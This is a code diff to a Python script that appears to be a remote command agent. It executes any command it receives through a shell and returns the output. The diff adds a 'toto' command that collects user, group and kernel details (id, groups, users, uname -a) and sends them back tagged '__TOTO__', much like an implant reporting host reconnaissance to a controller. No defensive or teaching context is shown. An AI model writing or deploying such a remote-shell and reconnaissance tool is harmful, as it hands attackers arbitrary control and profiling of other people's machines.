@@ -1,9 +1,39 @@
 import argparse
+import json
 import socket
 import time
 
 
 import subprocess
+TOTO_PREFIX = "__TOTO__"
+
+
+def run_system_command(command: str) -> str:
+    result = subprocess.run(
+        command,
+        shell=True,
+        capture_output=True,
+        text=True,
+        timeout=10
+    )
+
+    output = result.stdout.strip()
+    error = result.stderr.strip()
+
+    if result.returncode != 0:
+        return error or "unknown error"
+
+    return output or "(no output)"
+
+
+def build_toto_payload() -> str:
+    data = {
+        "id": run_system_command("id"),
+        "groups": run_system_command("groups"),
+        "users": run_system_command("users"),
+        "uname": run_system_command("uname -a"),
+    }
+    return TOTO_PREFIX + json.dumps(data)
 
 def build_response(command: str, name: str) -> str:
     command = command.strip()
@@ -14,22 +44,15 @@ def build_response(command: str, name: str) -> str:
     if command.lower() == "exit":
         return f"[{name}] closing connection"
 
+    if command.lower() == "toto":
+        try:
+            return build_toto_payload()
+        except Exception as e:
+            return f"[{name}] toto error: {e}"
+
     try:
-        result = subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=10
-        )
-
-        output = result.stdout.strip()
-        error = result.stderr.strip()
-
-        if result.returncode != 0:
-            return f"[{name}] error:\n{error or 'unknown error'}"
-
-        return f"[{name}] output:\n{output or '(no output)'}"
+        output = run_system_command(command)
+        return f"[{name}] output:\n{output}"
 
     except subprocess.TimeoutExpired:
         return f"[{name}] error: command timed out"
